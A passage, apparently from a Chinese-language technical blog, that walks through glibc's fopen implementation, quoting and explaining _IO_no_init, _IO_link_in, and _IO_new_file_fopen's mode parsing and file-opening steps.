locked_FILE));</span><br></pre></td></tr></table></figure><p>在64位系统中大小为0x230</p><p>该结构体包含三个结构体<code>_IO_FILE_plus</code>、<code>_IO_lock_t</code>、<code>_IO_wide_data</code>，其中<code>_IO_FILE_plus</code>为使用的<code>IO FILE</code>的结构体。</p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p><strong>_IO_no_init 对file结构体进行null初始化</strong></p><p>在分配完空间后，接着就调用<code>_IO_no_init</code>函数去null初始化结构体，跟进去该函数，函数在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">     <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_old_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (stdio_needs_locking)</span><br><span class="line">    fp-&gt;_flags2 |= _IO_FLAGS2_NEED_LOCK;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据参数初始化_IO_wide_data与_IO_FILE_plus,多数置为NULL</p><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p><strong>_IO_file_init将结构体链接进_IO_list_all</strong></p><p>在执行完<code>_IO_no_init</code>函数后，回到<code>__fopen_internal</code>函数，</p><p>函数将<code>_IO_FILE_plus</code>结构体的vtable设置成了<code>_IO_file_jumps</code>，</p><p>然后调用<code>_IO_file_init_internal</code>将<code>_IO_FILE_plus</code>结构体链接进入<code>_IO_list_all</code>链表，跟进去函数，函数在<code>/libio/fileops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init_internal (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的主体就是调用了<code>_IO_link_in</code>函数，跟进去，函数在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_link_in</code>函数的功能是检查FILE结构体是否包含<code>_IO_LINKED</code>标志，如果不包含则表示这个结构体没有链接进入<code>_IO_list_all</code>，则再后面把它链接进入<code>_IO_list_all</code>链表，同时设置FILE结构体的<code>_chain</code>字段为之前的链表的值，否则直接返回。</p><p>所以<code>_IO_file_init</code>主要功能是将FILE结构体链接进入<code>_IO_list_all</code>链表，在没执行<code>_IO_file_init</code>函数前<code>_IO_list_all</code>指向的是<code>stderr</code>结构体</p><h2 id="0x4-IO-new-file-fopen"><a href="#0x4-IO-new-file-fopen" class="headerlink" title="0x4_IO_new_file_fopen"></a>0x4_IO_new_file_fopen</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_file_fopen ((FILE *) new_f, filename, mode, is32)</span><br></pre></td></tr></table></figure><p>注意：上面的函数调用过程中将 new_f 指针从 locked_FILE 转为了 FILE，这样做是合法的，因为 locked_FILE 中第一个变量_IO_FILE_plus 的首个变量即是 FILE，实际上这样做使得 new_f 指针的访问被截断，只能访问前面 FILE 中的内容。</p><p>这里做了符号映射，实际调用_IO_file_fopen 被映射为_IO_new_file_fopen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_fopen (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">    <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  FILE *result;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))<span class="comment">//如果文件已经打开</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (*mode)<span class="comment">//参数选项不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">  omode = O_RDWR;</span><br><span class="line">  read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">  oflags |= O_EXCL;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">  oflags |= O_CLOEXEC;</span><br><span class="line">  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="comment">/* Ignore.  */</span></span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">  is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">      cs = <span class="built_in">strstr</span> (last_recognized + <span class="number">1</span>, <span class="string">&quot;,ccs=&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">     to wide.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line">  <span class="type">char</span> *endp = __strchrnul (cs + <span class="number">5</span>, <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">  <span class="type">char</span> *ccs = <span class="built_in">malloc</span> (endp - (cs + <span class="number">5</span>) + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ccs == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> malloc_err = errno;  <span class="comment">/* Whatever malloc failed with.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      __set_errno (malloc_err);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  *((<span class="type">char</span> *) __mempcpy (ccs, cs + <span class="number">5</span>, endp - (cs + <span class="number">5</span>))) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  strip (ccs, ccs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="number">2</span>] == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">   ? upstr (ccs, cs + <span class="number">5</span>) : ccs) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment"> This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment"> for these.  */</span></span><br><span class="line">      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">      <span class="built_in">free</span> (ccs);</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span> (ccs);</span><br><span class="line"></span><br><span class="line">  assert (fcts.towc_nsteps == <span class="number">1</span>);</span><br><span class="line">  assert (fcts.tomb_nsteps == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Clear the state.  We start all over again.  */</span></span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line"></span><br><span class="line">  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step = fcts.towc;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step = fcts.tomb;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* From now on use the wide character callback functions.  */</span></span><br><span class="line">  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the mode now.  */</span></span><br><span class="line">  result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-入参及局部变量准备"><a href="#1-入参及局部变量准备" class="headerlink" title="1.入参及局部变量准备"></a>1.入参及局部变量准备</h3><p>不多赘述，准备与 fopen 相关的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">210</span> FILE *</span><br><span class="line"><span class="number">211</span> _IO_new_file_fopen (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line"><span class="number">212</span>             <span class="type">int</span> is32not64)</span><br><span class="line"><span class="number">213</span> &#123;</span><br><span class="line"><span class="number">214</span>   <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line"><span class="number">215</span>   <span class="type">int</span> read_write;</span><br><span class="line"><span class="number">216</span>   <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line"><span class="number">217</span>   <span class="type">int</span> i;</span><br><span class="line"><span class="number">218</span>   FILE *result;</span><br><span class="line"><span class="number">219</span>   <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line"><span class="number">220</span>   <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br></pre></td></tr></table></figure><h3 id="2-如果文件已经打开，则返回-0"><a href="#2-如果文件已经打开，则返回-0" class="headerlink" title="2.如果文件已经打开，则返回 0"></a>2.如果文件已经打开，则返回 0</h3><p>判断方式也很简单，查看 fp 的_fileno 是否被赋值，正常打开一次之后，该值将被赋值为对应的 fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">222</span>   <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line"><span class="number">223</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">565</span> <span class="meta">#<span class="keyword">define</span> _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br></pre></td></tr></table></figure><h3 id="3-解析文件打开的-mode"><a href="#3-解析文件打开的-mode" class="headerlink" title="3.解析文件打开的 mode"></a>3.解析文件打开的 mode</h3><p>omode 记录 File access modes:只读/只写/读写</p><p>oflags 记录文件 open 的参数：</p><ul><li>O_CREAT：Create file if it doesn’t exist</li><li>O_TRUNC：Truncate file to zero length</li><li>O_APPEND：Writes append to the file</li><li>O_EXCL:Fail if file already exists</li><li>O_CLOEXEC:Set close_on_exec</li></ul><p>read_write 记录读写参数：</p><ul><li>_IO_NO_READS:Reading not allowed</li><li>_IO_NO_WRITES:Writing not allowed</li><li>_IO_IS_APPENDING:追加模式</li></ul><p>fp-&gt;_flags2 记录第二个 flags 信息：</p><ul><li>_IO_FLAGS2_MMAP：使用 mmap</li><li>_IO_FLAGS2_NOTCANCEL:不取消模式</li><li>_IO_FLAGS2_CLOEXEC:lose_on_exec</li></ul><p>last_recognized 记录最后检测到的模式。</p><h3 id="4-调用-IO-file-open-打开文件"><a href="#4-调用-IO-file-open-打开文件" class="headerlink" title="4.调用_IO_file_open 打开文件"></a>4.调用_IO_file_open 打开文件</h3><p>注意，这里大部分参数都是传入的，或者刚解析出来的，这个 oprot 是前文定义的局部变量<code>int oprot = 0666</code>,表示</p><ul><li><p>该文件拥有者对该文件拥有读写的权限但是没有操作的权限</p></li><li><p>该文件拥有者所在组的其他成员对该文件拥有读写的权限但是没有操作的权限</p></li><li><p>其他用户组的成员对该文件也拥有读写权限但是没有操作的权限</p></li></ul><p>调用_IO_file_open 的流程中大致可以分为如下几步：</p><ul><li><p>根据 flags2 决定是调用__open_nocancel 还是__open；</p></li><li><p>调用_IO_mask_flags 设定对应的 flags;</p></li><li>针对 append 模式，移动文件指针到_IO_seek_end；</li><li>将打开后的 fp link 到_IO_list_all 上</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">280</span>   result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line"><span class="number">281</span>               is32not64);</span><br><span class="line"></span><br><span class="line"><span class="number">179</span> FILE *</span><br><span class="line"><span class="number">180</span> _IO_file_open (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> posix_mode, <span class="type">int</span> prot,</span><br><span class="line"><span class="number">181</span>            